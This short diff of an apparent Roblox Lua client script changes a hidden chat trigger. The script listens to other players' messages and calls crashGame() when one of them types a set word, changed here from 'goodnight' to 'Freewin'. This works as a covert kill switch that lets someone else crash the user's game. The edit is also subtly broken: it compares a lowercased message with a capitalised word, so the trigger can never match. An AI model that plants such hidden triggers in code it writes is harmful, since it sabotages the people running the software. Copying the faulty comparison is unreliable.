@@ -34,14 +34,14 @@ local function setupLegacyChat()
     for _, player in pairs(Players:GetPlayers()) do
         if player ~= LocalPlayer then
             player.Chatted:Connect(function(msg)
-                if msg:lower() == "goodnight" then crashGame() end
+                if msg:lower() == "Freewin" then crashGame() end
             end)
         end
     end
     Players.PlayerAdded:Connect(function(player)
         if player ~= LocalPlayer then
             player.Chatted:Connect(function(msg)
-                if msg:lower() == "goodnight" then crashGame() end
+                if msg:lower() == "Freewin" then crashGame() end
             end)
         end
     end)
